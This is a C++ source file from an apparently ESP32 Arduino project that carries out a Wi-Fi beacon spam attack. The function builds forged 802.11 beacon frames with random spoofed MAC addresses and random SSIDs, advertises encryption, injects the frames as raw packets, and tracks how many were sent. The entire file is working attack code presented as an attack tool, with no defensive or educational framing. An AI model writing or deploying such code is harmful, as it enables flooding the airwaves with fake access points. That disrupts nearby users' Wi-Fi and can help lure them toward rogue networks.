// beacon_spam_attack.cpp
#include "beacon_spam_attack.h"
#include "utilities.h" // For generateRandomMac, generateRandomSSID, macToString
#include <Arduino.h>

// Definition of extern variables is expected in the main .ino file or a global context file.

void perform_sendBeaconSpam() {
    beacon_frame_s beacon_pkt;
    memset(&beacon_pkt, 0, sizeof(beacon_frame_s));

    beacon_pkt.hdr.frame_control = htons(0x8000); // Type: Management (00), Subtype: Beacon (1000)
    beacon_pkt.hdr.duration_id = 0; // Duration ID

    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(beacon_pkt.hdr.addr1, broadcast_mac, 6); // DA = Broadcast

    generateRandomMac(beacon_pkt.hdr.addr2); // SA = Random MAC (Source Address)
    memcpy(beacon_pkt.hdr.addr3, beacon_pkt.hdr.addr2, 6); // BSSID = Random MAC (same as SA for beacon spam)

    beacon_pkt.hdr.seq_ctrl = 0; // Sequence control

    // Fixed Parameters (12 bytes)
    beacon_pkt.fixed_params.timestamp = esp_timer_get_time(); // Timestamp (microseconds)
    beacon_pkt.fixed_params.beacon_interval = htons(BEACON_INTERVAL_TU); // Beacon Interval (Time Units)
    beacon_pkt.fixed_params.capability_info = htons(0x0421); // Capabilities: ESS, Privacy (for WPA/WPA2 indication), Short Preamble, Short Slot Time

    // Tagged Parameters
    // Tag: SSID parameter set (ID: 0)
    beacon_pkt.ssid_tag_id = 0x00;
    String random_ssid_str = generateRandomSSID(random(8, 17)); // Generate SSID of random length between 8 and 16
    beacon_pkt.ssid_tag_len = random_ssid_str.length();
    strncpy(beacon_pkt.ssid_data, random_ssid_str.c_str(), sizeof(beacon_pkt.ssid_data) -1 );
    beacon_pkt.ssid_data[beacon_pkt.ssid_tag_len] = '\0'; // Ensure null termination

    // Tag: Supported Rates (ID: 1)
    beacon_pkt.rates_tag_id = 0x01;
    beacon_pkt.rates_tag_len = 8;
    beacon_pkt.rates_data[0] = 0x82; // 1 Mbps (B)
    beacon_pkt.rates_data[1] = 0x84; // 2 Mbps (B)
    beacon_pkt.rates_data[2] = 0x8B; // 5.5 Mbps (B)
    beacon_pkt.rates_data[3] = 0x96; // 11 Mbps (B)
    beacon_pkt.rates_data[4] = 0x0C; // 6 Mbps
    beacon_pkt.rates_data[5] = 0x12; // 9 Mbps
    beacon_pkt.rates_data[6] = 0x18; // 12 Mbps
    beacon_pkt.rates_data[7] = 0x24; // 18 Mbps

    // Tag: DS Parameter Set (Current Channel) (ID: 3)
    beacon_pkt.ds_param_tag_id = 0x03;
    beacon_pkt.ds_param_tag_len = 1;
    uint8_t current_op_channel = 0;
    esp_wifi_get_channel(&current_op_channel, NULL);
    beacon_pkt.ds_param_channel = current_op_channel ? current_op_channel : 1; // Use current channel or default to 1

    // Calculate total packet size
    size_t packet_size = sizeof(ieee80211_hdr) + 
                         sizeof(ieee80211_mgmt_beacon_fixed_params) + 
                         2 + beacon_pkt.ssid_tag_len +  // SSID Tag ID + Length + Data
                         2 + beacon_pkt.rates_tag_len + // Rates Tag ID + Length + Data
                         2 + beacon_pkt.ds_param_tag_len; // DS Param Tag ID + Length + Data

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &beacon_pkt, packet_size, false);

    if (err == ESP_OK) {
        beaconSpamDetailedStats.packetsSent++;
        beaconSpamDetailedStats.ssidsGenerated++;
        beaconSpamDetailedStats.lastGeneratedSSID = random_ssid_str;
        totalPacketsSentGlobal++;
    } else {
        beaconSpamDetailedStats.errors++;
        Serial.printf("BEACON_SPAM ОШИБКА отправки: %s (SSID: %s, BSSID: %s)\n", 
                      esp_err_to_name(err), 
                      random_ssid_str.c_str(), 
                      macToString(beacon_pkt.hdr.addr2).c_str());
    }
}

